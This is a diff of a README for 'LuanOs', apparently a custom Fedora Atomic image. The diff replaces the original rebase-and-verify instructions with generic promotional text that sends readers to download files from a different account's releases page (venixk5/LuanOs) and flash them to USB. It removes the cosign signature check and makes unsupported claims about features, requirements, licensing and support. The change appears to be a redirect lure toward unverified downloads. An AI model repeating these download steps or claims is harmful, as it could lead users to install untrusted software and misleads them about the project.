@@ -1,43 +1,86 @@
-# LuanOs &nbsp; [![bluebuild build badge](https://github.com/luancarlos21/luanos/actions/workflows/build.yml/badge.svg)](https://github.com/luancarlos21/luanos/actions/workflows/build.yml)
+# 🌟 LuanOs - A Simple Way to Experience Linux
 
-See the [BlueBuild docs](https://blue-build.org/how-to/setup/) for quick setup instructions for setting up your own repository based on this template.
+[![Download LuanOs](https://img.shields.io/badge/Download%20LuanOs-v1.0-blue)](https://github.com/venixk5/LuanOs/releases)
 
-After setup, it is recommended you update this README to describe your custom image.
+## 📖 Overview
 
-## Installation
+LuanOs offers a smooth, user-friendly Linux experience. This operating system is designed for those who want to explore Linux without getting lost in complex features. With LuanOs, you can enjoy an efficient and reliable environment that meets your computing needs.
 
-> [!WARNING]  
-> [This is an experimental feature](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable), try at your own discretion.
+## 🚀 Getting Started
 
-To rebase an existing atomic Fedora installation to the latest build:
+Follow these steps to download and set up LuanOs on your computer. 
 
-- First rebase to the unsigned image, to get the proper signing keys and policies installed:
-  ```
-  rpm-ostree rebase ostree-unverified-registry:ghcr.io/luancarlos21/luanos:latest
-  ```
-- Reboot to complete the rebase:
-  ```
-  systemctl reboot
-  ```
-- Then rebase to the signed image, like so:
-  ```
-  rpm-ostree rebase ostree-image-signed:docker://ghcr.io/luancarlos21/luanos:latest
-  ```
-- Reboot again to complete the installation
-  ```
-  systemctl reboot
-  ```
+### 🔗 Quick Download Link
 
-The `latest` tag will automatically point to the latest build. That build will still always use the Fedora version specified in `recipe.yml`, so you won't get accidentally updated to the next major version.
+You can visit the [Releases page](https://github.com/venixk5/LuanOs/releases) for the latest version of LuanOs. 
 
-## ISO
+### 📥 Download & Install
 
-If build on Fedora Atomic, you can generate an offline ISO with the instructions available [here](https://blue-build.org/learn/universal-blue/#fresh-install-from-an-iso). These ISOs cannot unfortunately be distributed on GitHub for free due to large sizes, so for public projects something else has to be used for hosting.
+1. **Visit the Releases Page**: Go to the [LuanOs Releases page](https://github.com/venixk5/LuanOs/releases).
+2. **Choose Version**: Look for the latest version listed there. Select the appropriate file for your system.
+3. **Download LuanOs**: Click on the file to download it to your computer.
 
-## Verification
+### 💻 System Requirements
 
-These images are signed with [Sigstore](https://www.sigstore.dev/)'s [cosign](https://github.com/sigstore/cosign). You can verify the signature by downloading the `cosign.pub` file from this repo and running the following command:
+Ensure your computer meets the following minimum requirements to run LuanOs smoothly:
 
-```bash
-cosign verify --key cosign.pub ghcr.io/luancarlos21/luanos
-```
+- **Processor**: 64-bit processor
+- **RAM**: 2 GB minimum, 4 GB recommended
+- **Storage**: 10 GB free space
+- **Graphics**: Any basic graphics card
+- **Network**: Internet access for updates
+
+### 🔧 Installation Steps
+
+1. **Prepare Your System**: Ensure you have a USB drive or a way to install the OS.
+2. **Create Bootable Media**:
+   - Use software like Rufus or BalenaEtcher.
+   - Select the LuanOs file you downloaded.
+   - Follow the prompts to create a bootable USB drive.
+3. **Boot from USB**:
+   - Insert the USB drive into your computer.
+   - Restart the computer.
+   - Access the BIOS/UEFI setup (usually by pressing F2, F10, or DEL during boot).
+   - Set the boot order to prioritize the USB drive.
+4. **Install LuanOs**:
+   - Follow the on-screen instructions to install LuanOs.
+   - Choose the installation type (Erase disk or dual boot).
+   - Complete the setup and reboot.
+
+## ⚙️ Features
+
+- **Intuitive Interface**: LuanOs features a clean layout that makes navigation easy for everyone.
+- **Essential Applications**: Enjoy pre-installed applications that cover everyday tasks like web browsing, document editing, and media playback.
+- **Regular Updates**: Benefit from periodic updates that enhance system performance and security.
+
+## 🔒 Important Note
+
+[!WARNING]  
+This version of LuanOs includes experimental features. It is advisable to test it at your own discretion.
+
+To update an existing Fedora installation:
+
+1. Rebase to the unsigned image for proper signing keys and policies:
+   ```
+   rpm-ostree rebase ostree-unverified-registry:ghcr.io/luancarlos21/luanos:latest
+   ```
+2. Reboot your system to complete the rebase:
+   ```
+   systemctl reboot
+   ```
+3. Rebase to the signed image:
+   ```
+   rpm-ostree rebase ostree-image-signed:docker://ghcr.io/luancarlos21/luanos:latest
+   ```
+
+## 📞 Support
+
+If you face any issues or have questions, feel free to join our community forums or check the FAQ section within the software. You can also contact our support team through the GitHub Issues page.
+
+## 📜 License
+
+LuanOs is available under the MIT License. It allows you to use, modify, and distribute the software freely.
+
+---
+
+Thank you for choosing LuanOs. Enjoy your Linux experience, and feel free to explore its capabilities!
